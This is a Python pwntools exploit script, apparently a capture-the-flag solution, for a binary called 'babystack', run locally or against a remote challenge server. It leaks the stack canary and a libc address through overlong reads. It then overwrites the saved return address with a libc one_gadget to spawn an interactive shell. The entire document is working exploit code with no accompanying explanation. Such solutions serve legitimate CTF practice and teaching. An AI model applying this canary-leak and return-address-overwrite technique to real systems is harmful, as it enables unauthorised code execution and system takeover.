from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./babystack")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./babystack")
else:
	p = remote("111.198.29.45",30020)
	libc = ELF("libc-2.23.so")
	elf = ELF("./babystack")

def store(s):
	p.sendafter(">> ","1".ljust(0x20,"\x00"))
	p.send(s)

def show():
	p.sendafter(">> ","2".ljust(0x20,"\x00"))

def quit():
	p.sendafter(">> ","3".ljust(0x20,"\x00"))
	
def debugf():
	gdb.attach(p,"b *0x4009D8")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
#debugf()
store("a"*0x89)
show()
p.recvuntil("a"*0x88)
info = p.recv(8)
canary = u64(info) - 0x61
log.success("canary:"+hex(canary))
store("a"*0x98)
show()
p.recvuntil("a"*0x98)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["__libc_start_main"] - 240
log.success("libc_base:"+hex(libc.address))
one_gadget = libc.address + 0x45216
payload = "a"*0x88 + p64(canary) + "a"*8 + p64(one_gadget)
store(payload)
quit()
p.interactive()
